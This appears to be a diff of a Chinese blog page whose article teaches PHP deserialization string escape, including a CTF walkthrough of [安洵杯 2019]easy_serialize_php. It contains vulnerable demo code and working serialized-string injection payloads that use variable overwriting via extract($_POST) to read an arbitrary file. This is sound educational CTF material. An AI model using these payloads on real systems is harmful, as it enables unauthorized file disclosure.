@@ -1,22 +1,26 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-cn" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Ysper">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="前置知识学字符串逃逸前，首先要知道为什么可以造成字符串逃逸，以及php反序列化的几大特性。 php反序列化中以”;”作为字段的分隔，以”}”作为结尾（字符串除外），长度不对应时会报错 以我的结论来说，为什么会造成字符串逃逸： 一句话就是”}”结束符会闭合，导致我们输入的恶意代码会被正常的序列化，而后面的字符，因为提前闭合了，就会被舍弃。 两种情况1234过滤后字符减少             ｛意">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前置知识学字符串逃逸前，首先要知道为什么可以造成字符串逃逸，以及php反序列化的几大特性。 php反序列化中以”;”作为字段的分隔，以”}”作为结尾（字符串除外），长度不对应时会报错 以我的结论来说，为什么会造成字符串逃逸： 一句话就是”}”结束符会闭合，导致我们输入的恶意代码会被正常的序列化，而后面的字符，因为提前闭合了，就会被舍弃。 两种情况1234过滤后字符减少             ｛意">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php反序列化字符串逃逸">
 <meta property="og:url" content="http://example.com/2023/07/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/index.html">
@@ -37,280 +41,178 @@
 <meta property="article:modified_time" content="2023-07-28T07:23:38.723Z">
 <meta property="article:author" content="Ysper">
 <meta property="article:tag" content="字符串逃逸">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727150015856.png">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>php反序列化字符串逃逸 - Ysper</title>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+<link rel="canonical" href="http://example.com/2023/07/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">
 
 
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  <title>php反序列化字符串逃逸 | Ysper</title>
   
 
 
 
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/load.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
-<body>
-  
+</head>
 
-  <header>
-    
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Ysper_1</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Hejmpaĝo</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Arkivoj</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>Kategorio</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Etikedoj</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                <span>Pri</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ysper</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">橘子</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
 </nav>
 
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
   
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ysper">
+      <meta itemprop="description" content="橘子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ysper">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php反序列化字符串逃逸
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-27 11:17:04" itemprop="dateCreated datePublished" datetime="2023-07-27T11:17:04+08:00">2023-07-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-28 15:23:38" itemprop="dateModified" datetime="2023-07-28T15:23:38+08:00">2023-07-28</time>
+              </span>
+
           
-            <span id="subtitle" data-typed-text="php反序列化字符串逃逸"></span>
-          
+
         </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-27 11:17" pubdate>
-          2023年7月27日 上午
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          4.8k vortoj
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          40 minutoj
-        
-      </span>
-    
+      </header>
 
     
     
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> rigardoj
-        </span>
-        
-      
     
-  </div>
-
-
-        
-      </div>
+    <div class="post-body" itemprop="articleBody">
 
       
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">php反序列化字符串逃逸</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>学字符串逃逸前，首先要知道为什么可以造成字符串逃逸，以及php反序列化的几大特性。</p>
+        <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>学字符串逃逸前，首先要知道为什么可以造成字符串逃逸，以及php反序列化的几大特性。</p>
 <p>php反序列化中以”;”作为字段的分隔，以”}”作为结尾（字符串除外），长度不对应时会报错</p>
 <p>以我的结论来说，为什么会造成字符串逃逸：</p>
 <p>一句话就是”}”结束符会闭合，导致我们输入的恶意代码会被正常的序列化，而后面的字符，因为提前闭合了，就会被舍弃。</p>
@@ -336,7 +238,7 @@
 <p>小皮搭建环境</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">text</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ctf&#x27;</span>, <span class="hljs-string">&#x27;hack&#x27;</span>, <span class="hljs-variable">$str</span>);&#125;<br><span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$_GET</span>[name]&quot;</span>;<br><span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$_GET</span>[phone]&quot;</span>;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">text</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$x</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$re</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$r</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727150015856.png" srcset="/img/load.gif" lazyload alt="image-20230727150015856"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727150015856.png" alt="image-20230727150015856"></p>
 <p>现在我们要逃逸的字符串</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:5:&quot;</span>phone<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">110</span><span class="hljs-string">&quot;;&#125;要逃逸的</span><br><span class="hljs-string">&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;&#125;原先的<br></code></pre></td></tr></table></figure>
 
@@ -344,9 +246,9 @@
 <p>payload就为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctf<span class="hljs-string">&quot;;s:5:&quot;</span>phone<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">110</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727152604428.png" srcset="/img/load.gif" lazyload alt="image-20230727152604428"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727152604428.png" alt="image-20230727152604428"></p>
 <p>这样就成功了，把我们的phone修改为了110而不是我们赋值进去的1。</p>
-<h2 id="字符减少情况"><a href="#字符减少情况" class="headerlink" title="字符减少情况"></a>字符减少情况</h2><p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727154533218.png" srcset="/img/load.gif" lazyload alt="image-20230727154533218"></p>
+<h2 id="字符减少情况"><a href="#字符减少情况" class="headerlink" title="字符减少情况"></a>字符减少情况</h2><p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727154533218.png" alt="image-20230727154533218"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:5:&quot;</span>phone<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">110</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>同样的也是，这里替换后少了4个字符，自然就会报错，那么我们要把我们构造的字符缩进去，就需要</p>
@@ -355,7 +257,7 @@
 
 <p>因为在”;s:5:”phone”;s:1:” 这个后面是我们要控制的，让phone的值缩进去</p>
 <p>但是在运行的时候需要构造20位因为s后面1要变成两位因为计算的还有后面phone的值大于9</p>
-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727162011296.png" srcset="/img/load.gif" lazyload alt="image-20230727162011296"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/image-20230727162011296.png" alt="image-20230727162011296"></p>
 <h2 id="实际例题演示"><a href="#实际例题演示" class="headerlink" title="实际例题演示"></a>实际例题演示</h2><p>[安洵杯 2019]easy_serialize_php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -366,7 +268,7 @@
 
 
 <h3 id="键名逃逸"><a href="#键名逃逸" class="headerlink" title="键名逃逸"></a>键名逃逸</h3><p>由于使用了extract($_POST);函数会导致变量覆盖所以利用键名和他的替换函数构造我们想要的结果</p>
-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281426037.png" srcset="/img/load.gif" lazyload alt="屏幕截图 2023-07-28 142550"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281426037.png" alt="屏幕截图 2023-07-28 142550"></p>
 <p>这是最开始的样子没有任何赋值</p>
 <p>然后我们利用变量覆盖</p>
 <p>当我们传入</p>
@@ -382,13 +284,13 @@
 <p>构造出一个</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281504993.png" srcset="/img/load.gif" lazyload alt="屏幕截图 2023-07-28 150340"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281504993.png" alt="屏幕截图 2023-07-28 150340"></p>
 <p>这里看到序列化后传进去了两个变量</p>
 <p>“;s:49:”这代表一个变量，共有八个字符，所以在_SESSION[]里面要写入两个flag，让后面的缩进去</p>
 <p>最后的结果就变成了</p>
-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281508557.png" srcset="/img/load.gif" lazyload alt="屏幕截图 2023-07-28 150822"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281508557.png" alt="屏幕截图 2023-07-28 150822"></p>
 <p>这样就把我们的img变量插进去了，后面构成的闭合，把后面的变量舍弃了。</p>
-<h3 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h3><p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281511765.png" srcset="/img/load.gif" lazyload alt="屏幕截图 2023-07-28 142550"></p>
+<h3 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h3><p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281511765.png" alt="屏幕截图 2023-07-28 142550"></p>
 <p>利用SESSION[user],传入若干个flag，把function往前面缩，</p>
 <p>我们要缩进去的为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span>&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;  23个字符</span><br></code></pre></td></tr></table></figure>
@@ -398,388 +300,193 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>]=&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>实现的结果就是</p>
